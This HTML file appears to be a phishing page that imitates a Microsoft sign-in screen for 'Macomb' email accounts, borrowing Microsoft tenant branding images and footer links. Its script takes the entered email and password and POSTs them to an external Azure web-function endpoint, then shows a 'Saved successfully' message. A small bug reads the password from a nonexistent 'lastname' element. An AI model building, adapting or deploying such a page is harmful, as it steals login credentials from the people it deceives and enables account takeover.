<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Sign in to your account</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background-color: #1a1a2e;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    /* Background image mimicking the MS login backdrop */
    .background {
      position: fixed;
      inset: 0;
      background: url('https://aadcdn.msauthimages.net/dbd5a2dd-4dv7ejnztzslfb5xihpgfcp4tx-gvcgkhsy0o6bbusm/logintenantbranding/0/illustration?ts=637121887230750743') center center / cover no-repeat;
      z-index: 0;
    }
    .background-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.35);
      z-index: 1;
    }

    /* Lightbox card */
    .sign-in-box {
      position: relative;
      z-index: 10;
      background: #fff;
      border-radius: 4px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      padding: 44px 44px 36px;
      width: 440px;
      max-width: calc(100vw - 32px);
    }

    /* Microsoft logo */
    .ms-logo {
      margin-bottom: 16px;
    }
    .ms-logo svg {
      width: 108px;
      height: 24px;
    }

    h1.title {
      font-size: 24px;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 16px;
    }

    .subtitle {
      font-size: 13px;
      color: #605e5c;
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #323130;
      margin-bottom: 4px;
    }

    input[type="email"],
    input[type="text"],
    input[type="password"] {
      display: block;
      width: 100%;
      padding: 6px 8px;
      font-size: 15px;
      font-family: inherit;
      border: 1px solid #8a8886;
      border-radius: 2px;
      outline: none;
      color: #323130;
      background: #fff;
      transition: border-color 0.1s;
    }
    input:focus {
      border-color: #0067b8;
      border-width: 2px;
    }

    .field {
      margin-bottom: 20px;
    }

    /* Next / Submit button styled like MS */
    .btn-next {
      display: block;
      width: 100%;
      padding: 8px 12px;
      font-size: 15px;
      font-family: inherit;
      font-weight: 600;
      background-color: #0067b8;
      color: #fff;
      border: none;
      border-radius: 2px;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.15s;
    }
    .btn-next:hover { background-color: #005a9e; }
    .btn-next:active { background-color: #004f8c; }
    .btn-next:disabled { background-color: #a19f9d; cursor: default; }

    /* Result message */
    #result {
      margin-top: 16px;
      font-size: 13px;
      font-weight: 600;
      min-height: 18px;
    }
    .success { color: #107c10; }
    .error   { color: #a80000; }

    /* Footer */
    .footer {
      position: relative;
      z-index: 10;
      margin-top: 12px;
      display: flex;
      gap: 16px;
    }
    .footer a {
      font-size: 12px;
      color: #fff;
      text-decoration: none;
    }
    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <div class="background"></div>
  <div class="background-overlay"></div>

  <div class="sign-in-box">
    <!-- Banner logo -->
    <div class="ms-logo">
      <img src="https://aadcdn.msauthimages.net/dbd5a2dd-4dv7ejnztzslfb5xihpgfcp4tx-gvcgkhsy0o6bbusm/logintenantbranding/0/bannerlogo?ts=637121887239281351" alt="Logo" style="max-height: 48px; max-width: 200px;" />
    </div>

    <h1 class="title">Link Your Account</h1>
    <p class="subtitle">Use your Macomb email account</p>

    <form id="signinForm" novalidate>
      <div class="field">
        <label for="email">Email, phone, or Skype</label>
        <input type="email" id="email" autocomplete="username" placeholder="Email" required />
      </div>

      <div class="field">
        <label for="password">Password</label>
        <input type="password" id="password" autocomplete="current-password" placeholder="Password" required />
      </div>

      <button type="submit" class="btn-next" id="submitBtn">Sign in</button>
    </form>

    <p id="result"></p>
  </div>

  <div class="footer">
    <a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>
    <a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a>
  </div>

  <script>
    const form = document.getElementById("signinForm");
    const resultEl = document.getElementById("result");
    const submitBtn = document.getElementById("submitBtn");

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("lastname").value.trim();

      if (!email || !password) {
        resultEl.textContent = "Please enter your email and password.";
        resultEl.className = "error";
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = "Signing in...";
      resultEl.textContent = "";
      resultEl.className = "";

      try {
        const response = await fetch(
          "https://webappfunction-g3enf6bnfygjfcg4.eastus2-01.azurewebsites.net/api/submit",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: email, lastname: password })
          }
        );

        const data = await response.json();

        if (response.ok && data.success) {
          resultEl.textContent = "✅ Saved successfully!";
          resultEl.className = "success";
          form.reset();
        } else {
          resultEl.textContent = data.error || "❌ Failed to save data.";
          resultEl.className = "error";
        }
      } catch (err) {
        console.error("Submit failed:", err);
        resultEl.textContent = "❌ Network or server error.";
        resultEl.className = "error";
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "Sign in";
      }
    });
  </script>

</body>
</html>
